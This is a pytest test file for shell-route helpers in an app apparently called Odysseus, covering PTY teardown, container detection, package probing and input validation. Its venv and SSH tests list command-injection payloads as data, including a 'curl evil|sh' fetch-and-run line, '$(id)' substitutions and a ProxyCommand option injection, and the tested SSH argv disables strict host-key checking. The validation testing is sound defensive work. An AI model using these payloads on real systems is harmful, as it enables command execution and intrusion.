"""Tests for shell_routes.py helpers."""

import asyncio
import builtins
import errno
import importlib
import importlib.util
import json
import os
import shlex
import signal
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from core.platform_compat import pid_alive
from routes.shell_routes import (
    _find_line_break,
    _host_docker_access_enabled,
    _import_optional_dependency_for_status,
    _running_in_container,
    _docker_row_status,
    _package_installed_from_probe,
    _package_pip_update_status,
    _package_probe_script,
    _package_status_note,
    _prepend_user_install_bins_to_path,
    _reject_cross_site,
    _ssh_base_argv,
    _venv_activate_prefix,
    DOCKER_IN_CONTAINER_HINT,
)
from tests.helpers.unix_sockets import bound_unix_socket


def test_shell_routes_import_without_posix_pty_modules(monkeypatch):
    """Native Windows has no fcntl/termios; importing routes must still work."""
    real_import = builtins.__import__

    def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
        if name in {"fcntl", "pty"}:
            raise ImportError(f"No module named {name!r}")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    cached_modules = {name: sys.modules.pop(name, None) for name in ("fcntl", "pty")}

    module_path = Path(__file__).resolve().parents[1] / "routes" / "shell_routes.py"
    spec = importlib.util.spec_from_file_location(
        "_shell_routes_without_pty", module_path
    )
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    try:
        spec.loader.exec_module(module)
    finally:
        sys.modules.pop(spec.name, None)
        for name, cached_module in cached_modules.items():
            if cached_module is not None:
                sys.modules[name] = cached_module

    assert module.PTY_SUPPORTED is False
    assert module._find_line_break(b"ok\n") == (2, 1)


def test_shell_routes_import_without_sigkill(monkeypatch):
    """Native Windows has no signal.SIGKILL; app.py imports this module anyway.

    The teardown escalation is resolved at import time, so naming SIGKILL
    unconditionally would stop the whole app from starting on Windows rather
    than only degrading PTY teardown there.
    """
    monkeypatch.delattr(signal, "SIGKILL", raising=False)

    module_path = Path(__file__).resolve().parents[1] / "routes" / "shell_routes.py"
    spec = importlib.util.spec_from_file_location(
        "_shell_routes_without_sigkill", module_path
    )
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    try:
        spec.loader.exec_module(module)
    finally:
        sys.modules.pop(spec.name, None)

    assert module.PTY_KILL_ESCALATION == (signal.SIGTERM,)


async def test_generate_pty_reports_explicit_unsupported_error(monkeypatch):
    """Clients can distinguish unsupported PTY mode from process failures."""
    import routes.shell_routes as shell_routes

    monkeypatch.setattr(shell_routes, "PTY_SUPPORTED", False)
    monkeypatch.setattr(
        shell_routes, "_PTY_IMPORT_ERROR", ImportError("No module named 'termios'")
    )

    request = SimpleNamespace(is_disconnected=lambda: False)
    events = [
        json.loads(chunk.removeprefix("data: ").strip())
        async for chunk in shell_routes._generate_pty("echo hi", 5, request)
    ]

    assert events == [
        {
            "stream": "stderr",
            "data": "PTY streaming is not supported on this platform: No module named 'termios'",
            "error": shell_routes.PTY_UNSUPPORTED_ERROR,
        },
        {"exit_code": -1, "error": shell_routes.PTY_UNSUPPORTED_ERROR},
    ]


pty_session = pytest.mark.skipif(
    not hasattr(os, "setsid"), reason="process sessions are POSIX-only"
)


async def _spawn_pty_style_session(script: str):
    """Spawn `script` the way _generate_pty does: its own session via setsid,
    with the leader's identity and group bound at spawn."""
    import routes.shell_routes as shell_routes

    proc = await asyncio.create_subprocess_shell(
        script,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    shell_routes._bind_pty_spawn_identity(proc)
    return proc


def _bound_fake_leader(monkeypatch, pid=4242):
    """A fake PTY leader whose spawn identity verifies and still leads its group."""
    from src import process_lifecycle, process_ownership

    real_getpgid = os.getpgid
    monkeypatch.setattr(process_ownership, "verify", lambda p, token: process_ownership.OWNED)
    monkeypatch.setattr(os, "getpgid", lambda p: pid if p == pid else real_getpgid(p))
    return SimpleNamespace(
        pid=pid, returncode=0, wait=None,
        _ody_pty_identity=process_lifecycle.ProcessIdentity(pid, "spawn-token", pgid=pid),
    )


def _stubborn_child(pid_file: Path, ignore: tuple[str, ...]) -> str:
    """Shell snippet that starts a child ignoring `ignore`, then waits for it.

    Killing a PTY session leader makes the kernel send SIGHUP to the
    terminal's foreground process group, so a plain `sleep` child looks
    contained even when nothing ever signalled the group. A child that ignores
    SIGHUP is what an admin actually runs into — a `nohup`ed job, a daemon,
    anything meant to outlive its terminal.

    The child publishes its own pid only after installing the handlers, and
    the snippet blocks until it does, so a test can never signal it while it
    is still starting up and read that as teardown having worked.
    """
    ignores = "".join(
        f"signal.signal(signal.{name}, signal.SIG_IGN); " for name in ignore
    )
    script = (
        f"import os, signal, time; {ignores}"
        f"open({str(pid_file)!r}, 'w').write(str(os.getpid())); "
        "time.sleep(120)"
    )
    return (
        f"{sys.executable} -c {shlex.quote(script)} & "
        f"while [ ! -s {pid_file} ]; do sleep 0.02; done"
    )


async def _never_disconnected() -> bool:
    return False


def _reap_if_alive(pid: int) -> None:
    """Clean up a descendant the code under test was supposed to have killed."""
    if pid_alive(pid):
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass


async def _read_pid(path: Path, timeout: float = 5.0) -> int:
    """Wait for a child to publish its pid, then return it."""
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout
    while loop.time() < deadline:
        if path.exists():
            text = path.read_text().strip()
            if text:
                return int(text)
        await asyncio.sleep(0.01)
    raise AssertionError(f"child never wrote its pid to {path}")


@pty_session
async def test_terminate_pty_session_kills_descendants(tmp_path):
    """Tearing down a PTY command takes its children, not only the shell."""
    import routes.shell_routes as shell_routes

    pid_file = tmp_path / "child.pid"
    proc = await _spawn_pty_style_session(
        f"sleep 120 & echo $! > {pid_file}; sleep 120"
    )
    try:
        child_pid = await _read_pid(pid_file)
        assert pid_alive(child_pid)

        assert await shell_routes._terminate_pty_session(proc) is True

        assert proc.returncode is not None
        assert not pid_alive(child_pid)
    finally:
        await shell_routes._terminate_pty_session(proc)


@pty_session
async def test_terminate_pty_session_escalates_past_ignored_sigterm(tmp_path):
    """A child that ignores SIGTERM is still gone when teardown returns."""
    import routes.shell_routes as shell_routes

    pid_file = tmp_path / "child.pid"
    child = _stubborn_child(pid_file, ("SIGHUP", "SIGTERM"))
    proc = await _spawn_pty_style_session(f"{child}; sleep 120")
    try:
        child_pid = await _read_pid(pid_file)
        assert pid_alive(child_pid)

        assert await shell_routes._terminate_pty_session(proc) is True

        assert not pid_alive(child_pid)
    finally:
        await shell_routes._terminate_pty_session(proc)


@pty_session
async def test_generate_pty_timeout_kills_the_whole_session(tmp_path):
    """A timed-out PTY command leaves none of its children running."""
    import routes.shell_routes as shell_routes

    pid_file = tmp_path / "child.pid"
    child = _stubborn_child(pid_file, ("SIGHUP",))
    cmd = f"{child}; echo ready; sleep 120"
    request = SimpleNamespace(is_disconnected=_never_disconnected)

    events = [
        json.loads(chunk.removeprefix("data: ").strip())
        async for chunk in shell_routes._generate_pty(cmd, 1, request)
    ]

    child_pid = await _read_pid(pid_file)
    try:
        assert events[-1] == {"exit_code": -1}
        assert events[-2]["data"].startswith("Command timed out after 1s")
        assert not pid_alive(child_pid)
    finally:
        _reap_if_alive(child_pid)


@pty_session
async def test_generate_pty_disconnect_kills_the_whole_session(tmp_path):
    """Abandoning the stream kills the command's children too."""
    import routes.shell_routes as shell_routes

    pid_file = tmp_path / "child.pid"
    child = _stubborn_child(pid_file, ("SIGHUP",))
    cmd = f"{child}; echo ready; sleep 120"

    polls = []

    async def disconnect_after_first_poll() -> bool:
        polls.append(None)
        return len(polls) > 1

    request = SimpleNamespace(is_disconnected=disconnect_after_first_poll)

    async for _ in shell_routes._generate_pty(cmd, 0, request):
        pass

    child_pid = await _read_pid(pid_file)
    try:
        assert not pid_alive(child_pid)
    finally:
        _reap_if_alive(child_pid)


async def test_terminate_pty_session_reports_a_session_it_could_not_kill(
    monkeypatch,
):
    """Teardown returns False rather than claiming a surviving session died."""
    import routes.shell_routes as shell_routes

    monkeypatch.setattr(shell_routes, "PTY_KILL_GRACE", 0.01)
    monkeypatch.setattr(shell_routes, "_signal_session", lambda *_: True)
    monkeypatch.setattr(shell_routes, "_session_alive", lambda *_: True)

    proc = _bound_fake_leader(monkeypatch)
    assert await shell_routes._terminate_pty_session(proc) is False


async def test_terminate_pty_session_escalates_before_giving_up(monkeypatch):
    """SIGTERM then SIGKILL — the group is never signalled only once."""
    import routes.shell_routes as shell_routes

    sent = []
    monkeypatch.setattr(shell_routes, "PTY_KILL_GRACE", 0.01)
    monkeypatch.setattr(shell_routes, "_session_alive", lambda *_: True)
    monkeypatch.setattr(
        shell_routes,
        "_signal_session",
        lambda pgid, pid, sig: sent.append(sig) or True,
    )

    proc = _bound_fake_leader(monkeypatch)
    await shell_routes._terminate_pty_session(proc)

    assert sent == [signal.SIGTERM, signal.SIGKILL]


@pty_session
async def test_generate_pty_timeout_says_so_when_the_session_survives(
    monkeypatch,
):
    """A timed-out command no longer reports clean termination it didn't get."""
    import routes.shell_routes as shell_routes

    real_terminate = shell_routes._terminate_pty_session

    async def terminate_but_report_failure(proc):
        await real_terminate(proc)
        return False

    monkeypatch.setattr(
        shell_routes, "_terminate_pty_session", terminate_but_report_failure
    )

    request = SimpleNamespace(is_disconnected=_never_disconnected)
    events = [
        json.loads(chunk.removeprefix("data: ").strip())
        async for chunk in shell_routes._generate_pty("echo ready; sleep 30", 1, request)
    ]

    assert events[-1] == {"exit_code": -1}
    timed_out = events[-2]
    assert timed_out["stream"] == "stderr"
    assert timed_out["data"] == (
        "Command timed out after 1s" + shell_routes.PTY_KILL_FAILED_HINT
    )


@pytest.mark.skipif(os.name == "nt", reason="POSIX process groups")
async def test_terminate_pty_session_never_signals_the_servers_own_group(monkeypatch):
    """If setsid did not apply, the child's group is ours: reach the child alone."""
    import routes.shell_routes as shell_routes

    from src import process_ownership

    own = os.getpgid(0)
    sent = []
    monkeypatch.setattr(shell_routes, "PTY_KILL_GRACE", 0.01)
    monkeypatch.setattr(shell_routes.process_lifecycle, "pgid_of", lambda _pid: own)
    monkeypatch.setattr(process_ownership, "start_token", lambda pid: "the-leader")

    proc = SimpleNamespace(pid=987654, returncode=0, wait=None)
    assert shell_routes._session_pgid(proc.pid) is None
    shell_routes._bind_pty_spawn_identity(proc)
    assert proc._ody_pty_identity.pgid is None  # no safe session group recorded

    monkeypatch.setattr(os, "killpg", lambda pgid, sig: sent.append(("group", pgid, sig)))
    monkeypatch.setattr(os, "kill", lambda pid, sig: sent.append(("pid", pid, sig)))
    await shell_routes._terminate_pty_session(proc)

    assert sent and all(kind == "pid" and target == 987654 for kind, target, _ in sent), sent


@pytest.mark.skipif(os.name == "nt", reason="POSIX process groups")
async def test_terminate_pty_session_never_signals_a_reused_leader_pid(monkeypatch):
    """Leader spawned and bound → reaped → pid reissued → teardown signals nothing.

    The replacement is the worst case: an unrelated session leader, so both
    its pid and its process group carry the number our leader had.
    """
    import routes.shell_routes as shell_routes
    from src import process_ownership

    pid = 987650
    real_getpgid = os.getpgid
    occupant = {"token": "leader-token"}
    monkeypatch.setattr(process_ownership, "start_token",
                        lambda p: occupant["token"] if int(p) == pid else None)
    monkeypatch.setattr(os, "getpgid", lambda p: pid if p == pid else real_getpgid(p))

    proc = SimpleNamespace(pid=pid, returncode=None, wait=None)
    shell_routes._bind_pty_spawn_identity(proc)  # spawn time: the leader we just created
    assert proc._ody_pty_identity.pgid == pid

    # The leader exits and is reaped; the kernel reissues its pid to a stranger.
    proc.returncode = 0
    occupant["token"] = "replacement-token"
    signalled = []
    monkeypatch.setattr(os, "killpg", lambda g, sig: sig and signalled.append(("group", g, sig)))
    monkeypatch.setattr(os, "kill", lambda p, sig: sig and signalled.append(("pid", p, sig)))
    monkeypatch.setattr(shell_routes, "PTY_KILL_GRACE", 0.01)

    await shell_routes._terminate_pty_session(proc)

    assert signalled == [], f"teardown signalled the replacement: {signalled}"


def test_session_alive_treats_a_refused_probe_as_alive(monkeypatch):
    """EPERM says the group exists but we may not signal it, not that it died.

    Only ESRCH proves a process group is gone. Collapsing every OSError into
    "gone" is the one error that makes teardown report a surviving session as
    contained.
    """
    import routes.shell_routes as shell_routes

    def refuse(_pgid, _sig):
        raise PermissionError(errno.EPERM, "Operation not permitted")

    monkeypatch.setattr(shell_routes.os, "killpg", refuse)
    assert shell_routes._session_alive(4242, 4242) is True

    def gone(_pgid, _sig):
        raise ProcessLookupError(errno.ESRCH, "No such process")

    monkeypatch.setattr(shell_routes.os, "killpg", gone)
    assert shell_routes._session_alive(4242, 4242) is False


async def test_terminate_pty_session_reports_a_group_it_may_not_signal(monkeypatch):
    """A session we cannot signal at all is reported as not contained.

    Both the signal and the liveness probe are refused, so teardown has done
    nothing and must say so rather than infer death from its own failure.
    """
    import routes.shell_routes as shell_routes

    def refuse(*_args):
        raise PermissionError(errno.EPERM, "Operation not permitted")

    monkeypatch.setattr(shell_routes, "PTY_KILL_GRACE", 0.01)
    proc = _bound_fake_leader(monkeypatch)
    monkeypatch.setattr(shell_routes.os, "killpg", refuse)
    monkeypatch.setattr(shell_routes.os, "kill", refuse)

    assert await shell_routes._terminate_pty_session(proc) is False


class TestFindLineBreak:
    """Test line-break detection in byte buffers."""

    def test_newline(self):
        assert _find_line_break(b"hello\nworld") == (5, 1)

    def test_crlf(self):
        assert _find_line_break(b"hello\r\nworld") == (5, 2)

    def test_cr_only(self):
        assert _find_line_break(b"hello\rworld") == (5, 1)

    def test_no_breaks(self):
        assert _find_line_break(b"no breaks") == (-1, 0)

    def test_empty(self):
        assert _find_line_break(b"") == (-1, 0)

    def test_leading_newline(self):
        assert _find_line_break(b"\n") == (0, 1)

    def test_leading_cr(self):
        assert _find_line_break(b"\r") == (0, 1)

    def test_leading_crlf(self):
        assert _find_line_break(b"\r\n") == (0, 2)

    def test_multiple_newlines(self):
        """Should find the first one."""
        assert _find_line_break(b"a\nb\nc") == (1, 1)

    def test_cr_before_newline_not_adjacent(self):
        """\\r at pos 2, \\n at pos 5 — not CRLF, should return \\r pos."""
        assert _find_line_break(b"ab\rcd\n") == (2, 1)

    def test_newline_before_cr(self):
        """\\n comes before \\r — should return \\n."""
        assert _find_line_break(b"ab\ncd\r") == (2, 1)


class TestRunningInContainer:
    """Detect whether the Odysseus process itself runs inside a container."""

    def test_dockerenv_marker_present(self, tmp_path):
        marker = tmp_path / ".dockerenv"
        marker.write_text("")
        assert (
            _running_in_container(
                dockerenv_path=str(marker),
                cgroup_path=str(tmp_path / "missing"),
            )
            is True
        )

    def test_cgroup_names_a_container_runtime(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("12:devices:/docker/abcdef0123456789\n")
        assert (
            _running_in_container(
                dockerenv_path=str(tmp_path / "no-marker"),
                cgroup_path=str(cgroup),
            )
            is True
        )

    def test_bare_host_has_neither_signal(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("0::/user.slice/session-1.scope\n")
        assert (
            _running_in_container(
                dockerenv_path=str(tmp_path / "no-marker"),
                cgroup_path=str(cgroup),
            )
            is False
        )

    def test_missing_cgroup_file_is_not_a_container(self, tmp_path):
        assert (
            _running_in_container(
                dockerenv_path=str(tmp_path / "no-marker"),
                cgroup_path=str(tmp_path / "also-missing"),
            )
            is False
        )


class TestAppleSiliconDetection:
    """APFEL should only surface as available on native Apple Silicon Macs."""

    def test_reports_true_on_macos_arm64(self, monkeypatch):
        import core.platform_compat as platform_compat

        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
        importlib.reload(platform_compat)

        assert platform_compat.IS_APPLE_SILICON is True

    @pytest.mark.parametrize("machine", ["x86_64", "amd64"])
    def test_reports_false_off_apple_silicon(self, monkeypatch, machine):
        import core.platform_compat as platform_compat

        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
        monkeypatch.setattr(platform_compat.platform, "machine", lambda: machine)
        importlib.reload(platform_compat)

        assert platform_compat.IS_APPLE_SILICON is False

    def test_reports_false_on_non_macos(self, monkeypatch):
        import core.platform_compat as platform_compat

        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Linux")
        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
        importlib.reload(platform_compat)

        assert platform_compat.IS_APPLE_SILICON is False


class TestDockerRowStatus:
    """Applicability plus install hint for the docker dependency row."""

    DEFAULT = "Install Docker on the selected server."

    def test_in_container_and_absent_is_not_applicable_with_safe_default_hint(self):
        status = _docker_row_status(
            on_remote=False,
            in_container=True,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is False
        assert status.install_hint == DOCKER_IN_CONTAINER_HINT

    def test_in_container_cli_without_opt_in_is_not_applicable(self):
        status = _docker_row_status(
            on_remote=False,
            in_container=True,
            installed=True,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is False
        assert status.install_hint == DOCKER_IN_CONTAINER_HINT

    def test_in_container_opt_in_with_socket_is_applicable(self):
        status = _docker_row_status(
            on_remote=False,
            in_container=True,
            installed=True,
            default_hint=self.DEFAULT,
            host_docker_access=True,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_on_host_and_absent_stays_applicable_with_default_hint(self):
        status = _docker_row_status(
            on_remote=False,
            in_container=False,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_is_always_applicable_even_when_absent(self):
        status = _docker_row_status(
            on_remote=True,
            in_container=False,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_ignores_local_container_status(self):
        status = _docker_row_status(
            on_remote=True,
            in_container=True,
            installed=False,
            default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_container_hint_steers_to_remote_and_warns_on_socket(self):
        lowered = DOCKER_IN_CONTAINER_HINT.lower()
        assert "remote" in lowered
        assert "socket" in lowered
        assert "high-trust" in lowered
        assert "docker/host-docker.yml" in lowered


class TestHostDockerAccess:
    def test_opt_in_without_socket_is_disabled(self, monkeypatch, tmp_path):
        monkeypatch.setenv("ODYSSEUS_ENABLE_HOST_DOCKER", "true")

        assert _host_docker_access_enabled(str(tmp_path / "missing.sock")) is False

    def test_regular_file_is_not_accepted(self, monkeypatch, tmp_path):
        socket_path = tmp_path / "docker.sock"
        socket_path.touch()
        monkeypatch.setenv("ODYSSEUS_ENABLE_HOST_DOCKER", "true")

        assert _host_docker_access_enabled(str(socket_path)) is False

    @pytest.mark.parametrize("flag", [None, "false"])
    def test_socket_without_explicit_opt_in_is_disabled(
        self,
        monkeypatch,
        flag,
    ):
        # Not tmp_path: binding under $TMPDIR overruns sun_path on macOS.
        with bound_unix_socket() as socket_path:
            if flag is None:
                monkeypatch.delenv("ODYSSEUS_ENABLE_HOST_DOCKER", raising=False)
            else:
                monkeypatch.setenv("ODYSSEUS_ENABLE_HOST_DOCKER", flag)

            assert _host_docker_access_enabled(socket_path) is False

    def test_explicit_opt_in_with_unix_socket_is_enabled(
        self,
        monkeypatch,
    ):
        with bound_unix_socket() as socket_path:
            monkeypatch.setenv("ODYSSEUS_ENABLE_HOST_DOCKER", "true")

            assert _host_docker_access_enabled(socket_path) is True


class TestPackageProbeStatus:
    """Dependency rows should reflect serve readiness, not import coincidences."""

    def test_vllm_namespace_without_cli_is_not_installed(self):
        probe = {
            "modules": {
                "vllm": {
                    "found": True,
                    "origin": None,
                    "loader": None,
                    "locations": ["/root/vllm"],
                    "real_module": False,
                }
            },
            "dists": {},
            "binaries": {"vllm": None},
        }

        assert _package_installed_from_probe("vllm", probe) is False
        assert "namespace" in _package_status_note("vllm", probe)
        assert "no vLLM CLI" in _package_status_note("vllm", probe)

    def test_vllm_requires_cli_for_current_serve_command(self):
        probe = {
            "modules": {"vllm": {"found": True, "real_module": True}},
            "dists": {"vllm": "0.8.5"},
            "binaries": {"vllm": "/home/user/venv/bin/vllm"},
        }

        assert _package_installed_from_probe("vllm", probe) is True
        assert "python package: vllm 0.8.5" in _package_status_note("vllm", probe)
        assert (
            _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe).available
            is True
        )

    def test_vllm_cli_without_dist_is_external_for_update(self):
        probe = {
            "modules": {"vllm": {"found": False, "real_module": False}},
            "dists": {},
            "binaries": {"vllm": "/opt/vllm/bin/vllm"},
        }

        status = _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe)

        assert _package_installed_from_probe("vllm", probe) is True
        assert status.available is False
        assert "outside Odysseus" in status.note

    def test_llama_cpp_is_installed_when_native_llama_server_exists(self):
        probe = {
            "modules": {"llama_cpp": {"found": False, "real_module": False}},
            "dists": {},
            "binaries": {"llama-server": "/usr/local/bin/llama-server"},
        }

        assert _package_installed_from_probe("llama_cpp", probe) is True
        assert "native llama-server" in _package_status_note("llama_cpp", probe)
        status = _package_pip_update_status(
            {"name": "llama_cpp", "pip": "llama-cpp-python[server]"}, probe
        )
        assert status.available is False
        assert "package manager or source checkout" in status.note

    def test_apfel_does_not_use_generic_outside_odysseus_note(self):
        status = _package_pip_update_status(
            {"name": "APFEL", "pip": "", "update_cmd": "brew upgrade apfel"},
            {"binaries": {}, "dists": {}, "modules": {}},
        )

        assert status.available is False
        assert "Update this system dependency outside Odysseus." not in status.note

    def test_diffusers_requires_torch_too(self):
        missing_torch = {
            "modules": {
                "diffusers": {"found": True, "real_module": True},
                "torch": {"found": False},
            },
            "dists": {"diffusers": "0.37.0"},
            "binaries": {},
        }
        ready = {
            "modules": {
                "diffusers": {"found": True, "real_module": True},
                "torch": {"found": True, "real_module": True},
            },
            "dists": {"diffusers": "0.37.0", "torch": "2.10.0"},
            "binaries": {},
        }

        assert _package_installed_from_probe("diffusers", missing_torch) is False
        assert _package_installed_from_probe("diffusers", ready) is True

    def test_local_user_install_bin_is_added_to_path(self, monkeypatch, tmp_path):
        user_base = tmp_path / "user-base"
        monkeypatch.setattr("site.USER_BASE", str(user_base))
        monkeypatch.setenv("HOME", str(tmp_path / "home"))
        monkeypatch.setenv("PATH", "/usr/bin")

        _prepend_user_install_bins_to_path()

        parts = os.environ["PATH"].split(os.pathsep)
        assert str(user_base / "bin") in parts
        assert str(tmp_path / "home" / ".local" / "bin") in parts

    def test_remote_package_probe_checks_user_install_bin(self):
        script = _package_probe_script(["vllm"])

        assert "site.USER_BASE" in script
        assert "os.path.expanduser('~/.local/bin')" in script
        assert "add_user_install_bins_to_path()" in script
        assert "shutil.which(b)" in script

    def test_status_import_prepares_optional_dependency(self, monkeypatch):
        import routes.shell_routes as shell_routes

        calls = []
        monkeypatch.setattr(
            shell_routes,
            "prepare_optional_dependency_import",
            lambda name: calls.append(name),
        )
        monkeypatch.setattr(
            shell_routes.importlib,
            "import_module",
            lambda name: SimpleNamespace(__name__=name),
        )

        module = _import_optional_dependency_for_status("realesrgan")

        assert module.__name__ == "realesrgan"
        assert calls == ["realesrgan"]


class TestSshBaseArgv:
    def test_basic_host_no_port(self):
        assert _ssh_base_argv("user@example.com", None) == [
            "ssh",
            "-o",
            "ConnectTimeout=6",
            "-o",
            "StrictHostKeyChecking=no",
            "user@example.com",
        ]

    def test_default_port_22_omitted(self):
        assert "-p" not in _ssh_base_argv("h", "22")
        assert "-p" not in _ssh_base_argv("h", "")
        assert "-p" not in _ssh_base_argv("h", None)

    def test_custom_port_added_as_separate_argv(self):
        assert _ssh_base_argv("h", "2222")[-3:] == ["-p", "2222", "h"]

    @pytest.mark.parametrize("bad", ["0", "70000", "-1", "8a", "$(id)", "22 22"])
    def test_bad_port_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv("h", bad)

    def test_option_injecting_host_rejected(self):
        with pytest.raises(ValueError):
            _ssh_base_argv("-oProxyCommand=touch /tmp/pwn", None)

    @pytest.mark.parametrize("bad", ["", "   ", None])
    def test_empty_host_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv(bad, None)


class TestVenvActivatePrefix:
    def test_empty_returns_blank(self):
        assert _venv_activate_prefix(None) == ""
        assert _venv_activate_prefix("") == ""

    def test_appends_bin_activate(self):
        assert _venv_activate_prefix("~/venv") == ". ~/venv/bin/activate && "

    def test_already_pointing_at_activate(self):
        assert (
            _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "
        )

    @pytest.mark.parametrize(
        "bad",
        [
            "/opt/v && curl evil|sh",
            "$(id)",
            "`id`",
            "v;id",
            "v\nid",
            "v|id",
        ],
    )
    def test_injection_payloads_rejected(self, bad):
        with pytest.raises(ValueError):
            _venv_activate_prefix(bad)


class TestRejectCrossSite:
    @staticmethod
    def _req(headers):
        return SimpleNamespace(headers=headers)

    def test_cross_site_rejected(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc:
            _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
        assert exc.value.status_code == 403

    @pytest.mark.parametrize("site", ["same-origin", "same-site", "none"])
    def test_same_origin_and_direct_nav_allowed(self, site):
        assert _reject_cross_site(self._req({"sec-fetch-site": site})) is None

    def test_missing_header_allowed(self):
        assert _reject_cross_site(self._req({})) is None
